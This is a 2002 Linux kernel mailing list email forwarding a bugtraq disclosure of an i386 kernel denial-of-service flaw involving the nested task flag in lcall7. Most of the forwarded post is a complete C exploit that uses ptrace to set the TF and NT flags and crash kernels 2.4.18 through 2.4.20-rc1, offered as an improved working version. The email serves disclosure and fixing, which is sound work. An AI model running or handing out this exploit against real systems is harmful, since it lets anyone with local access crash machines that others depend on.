Return-Path: <linux-kernel-owner+willy=40w.ods.org@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id <S264010AbSKMXbf>; Wed, 13 Nov 2002 18:31:35 -0500
Received: (majordomo@vger.kernel.org) by vger.kernel.org
	id <S264622AbSKMXbf>; Wed, 13 Nov 2002 18:31:35 -0500
Received: from twin.jikos.cz ([217.11.236.59]:65196 "EHLO twin.jikos.cz")
	by vger.kernel.org with ESMTP id <S264010AbSKMXbd>;
	Wed, 13 Nov 2002 18:31:33 -0500
Date: Thu, 14 Nov 2002 00:38:13 +0100 (CET)
From: Jirka Kosina <jikos@jikos.cz>
To: Alan Cox <alan@lxorguk.ukuu.org.uk>
cc: Christoph Hellwig <hch@infradead.org>, Leif Sawyer <lsawyer@gci.com>,
       Linux Kernel Mailing List <linux-kernel@vger.kernel.org>
Subject: Re: FW: i386 Linux kernel DoS
In-Reply-To: <1037146219.10083.15.camel@irongate.swansea.linux.org.uk>
Message-ID: <Pine.LNX.4.44-jikos1.0211140036240.26832-100000@twin.jikos.cz>
References: <BF9651D8732ED311A61D00105A9CA3150B45FB3C@berkeley.gci.com> 
 <20021112233150.A30484@infradead.org> <1037146219.10083.15.camel@irongate.swansea.linux.org.uk>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org

On 13 Nov 2002, Alan Cox wrote:

> > > This was posted on bugtraq today...
> > A real segfaulting program?  wow :)
> Looks like the TF handling bug which was fixed a while ago

This was posted today ;) (uff, the two-side forwarded conversation ;) )

== cut here ==
>From DEVINE@iie.cnam.fr Thu Nov 14 00:35:59 2002
Date: Wed, 13 Nov 2002 00:59:09 +0000
From: Christophe Devine <DEVINE@iie.cnam.fr>
To: bugtraq@securityfocus.com
Subject: Re: i386 Linux kernel DoS

On Wed, 13 Nov 2002, Stefan Laudat wrote:

> Regarding this issue: is it 80x86 or specifically 80386 designed ?
> Been trying it on AMD Duron, AMD Athlon MP, Intel i586 - just segfaults :(

Yep; the first version of the DoS I posted on bugtraq was defective and
worked only under special conditions (inside gdb for example).

However this updated version works much better:

#include <sys/ptrace.h>

struct user_regs_struct {
        long ebx, ecx, edx, esi, edi, ebp, eax;
        unsigned short ds, __ds, es, __es;
        unsigned short fs, __fs, gs, __gs;
        long orig_eax, eip;
        unsigned short cs, __cs;
        long eflags, esp;
        unsigned short ss, __ss;
};

int main( void )
{
    int pid;
    char dos[] = "\x9A\x00\x00\x00\x00\x07\x00";
    void (* lcall7)( void ) = (void *) dos;
    struct user_regs_struct d;

    if( ! ( pid = fork() ) )
    {
        usleep( 1000 );
        (* lcall7)();
    }
    else
    {
        ptrace( PTRACE_ATTACH, pid, 0, 0 );
        while( 1 )
        {
            wait( 0 );
            ptrace( PTRACE_GETREGS, pid, 0, &d );
            d.eflags |= 0x4100; /* set TF and NT */
            ptrace( PTRACE_SETREGS, pid, 0, &d );
            ptrace( PTRACE_SYSCALL, pid, 0, 0 );
        }
    }

    return 1;
}

At the beginning I thought only kernels <= 2.4.18 were affected; but it
appeared that both kernels 2.4.19 and 2.4.20-rc1 are vulnerable as well.
The flaw seems to be related to the kernel's handling of the nested task 
(NT) flag inside a lcall7. 

== cut here ==

-- 
JiKos.


